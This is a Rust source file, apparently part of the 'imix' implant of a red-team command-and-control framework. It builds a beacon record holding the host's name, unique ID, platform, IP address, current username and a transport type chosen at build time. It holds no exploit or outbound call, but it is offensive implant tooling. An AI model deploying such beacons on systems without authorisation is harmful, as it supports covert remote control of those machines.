use crate::system::{get_host_platform, get_primary_ip};
use uuid::Uuid;

/// Build default Beacon info for the agent
pub fn build_beacon_info(imix_version: &str) -> pb::c2::Beacon {
    let agent = pb::c2::Agent {
        identifier: format!("imix-v{}", imix_version),
    };

    let selectors = host_unique::defaults();

    let host = pb::c2::Host {
        name: whoami::fallible::hostname().unwrap_or(String::from("")),
        identifier: host_unique::get_id_with_selectors(selectors).to_string(),
        platform: get_host_platform() as i32,
        primary_ip: get_primary_ip(),
    };

    // Try to grab the beacon identitifier from env var, o/w use  a random UUID
    let beacon_id =
        std::env::var("IMIX_BEACON_ID").unwrap_or_else(|_| String::from(Uuid::new_v4()));

    // Transport variable is used in Beacon struct below, but appears unused in some feature configurations
    #[allow(unused_variables)]
    #[cfg(feature = "dns")]
    let transport = pb::c2::beacon::Transport::Dns;
    #[allow(unused_variables)]
    #[cfg(feature = "http1")]
    let transport = pb::c2::beacon::Transport::Http1;
    #[allow(unused_variables)]
    #[cfg(feature = "grpc")]
    let transport = pb::c2::beacon::Transport::Grpc;
    #[allow(unused_variables)]
    #[cfg(not(any(feature = "dns", feature = "http1", feature = "grpc")))]
    let transport = pb::c2::beacon::Transport::Unspecified;

    pb::c2::Beacon {
        identifier: beacon_id,
        principal: whoami::username(),
        transport: transport as i32,
        host: Some(host),
        agent: Some(agent),
    }
}
